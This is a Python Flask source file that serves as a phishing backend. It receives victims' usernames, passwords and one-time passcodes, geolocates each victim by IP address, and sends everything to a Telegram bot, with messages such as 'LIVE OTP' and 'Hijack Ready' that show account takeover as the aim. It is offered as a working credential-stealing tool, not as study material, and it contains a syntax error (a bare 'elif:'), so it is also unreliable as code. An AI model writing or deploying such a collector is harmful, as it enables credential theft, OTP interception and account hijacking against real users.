from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Dashboard mein ye dono Environment Variables set honi chahiye
TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def handle_requests():
    try:
        data = request.get_json(force=True)
        dtype = data.get('t')
        user = data.get('u', 'Unknown')
        
        # IP and Location Tracking
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        city = geo.get('city', 'Unknown')
        isp = geo.get('isp', 'Unknown')

        if dtype == 'VISIT':
            msg = f"👀 **TARGET DETECTED**\n📍 City: `{city}`\n🌐 Network: `{isp}`\n📱 Device: `{data.get('d')[:50]}...`"

          
        elif dtype == 'OTP_RECEIVED':
            # Yahan se OTP Telegram par jayega
            otp_code = data.get('o')
            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **LIVE OTP: {otp_code}**\n🔥 Status: Hijack Ready"

        elif:
            # Login and Passwords
            password = data.get('p')
            msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}"
        
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def handler(req, res):
    return app(req, res)
    
